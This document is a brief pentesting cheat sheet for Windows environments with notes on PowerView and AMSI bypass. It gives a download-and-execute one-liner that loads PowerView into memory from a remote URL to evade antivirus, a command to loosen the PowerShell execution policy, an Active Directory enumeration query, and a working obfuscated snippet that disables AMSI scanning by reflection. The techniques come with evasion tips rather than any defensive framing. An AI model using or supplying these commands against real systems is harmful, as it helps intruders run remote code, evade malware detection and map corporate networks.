# Updates:

| date | name | description | comment | link |
| --- | --- | --- | --- | --- |
| 07/2020 | PowerView | Different tools for enumaration in Active Directory | Active Directory | [PowerView](#powerview) |
| 09/2020 | AMSI bypass | Technique to bypass Antivirus check when executing powershell scripts | AMSI bypass | [AMSI bypass](#amsi-bypass) |


# PowerView

## Using PowerView: 

cheatsheet: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

## Load into memory from remote (to avoid AV detection):

> iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"))```
  
**NOTE:** if AV detects the URL, then just host it somewhere on your own
**NOTE:** If execution is forbidden in powershell use this:
```powershell
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```
    
## Use something like this syntax:

> Get-NetUser -Filter "(title=Test Developer Junior)" | select name,samaccountname,title,manager

## Avoiding Antivirus:

In case AV prevents executing PowerShell scripts, try to bypass AMSI (https://www.youtube.com/watch?v=yHstFvLwDYM)

---

# AMSI bypass

To check if AMSI is active, type **"amsiutils"** (along with quotes) into the powershell prompt. If it is active, you will see a warning; otherwise, you'll see that word printed out. That way you can check if AMSI bypass was successful.

AV will be triggered by the word **amsiutils**, so it has to be obfuscated in some way. Here is one of the possible solutions:

```powershell
$r =[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$o="4456625220575263174452554847"
$c =[string](0..13|%{[char][int](53+($o).substring(($_*2),2))})-replace " "
$k =$r.GetField($c,'NonPublic,Static')
$k.SetValue($null,$true)
```

---
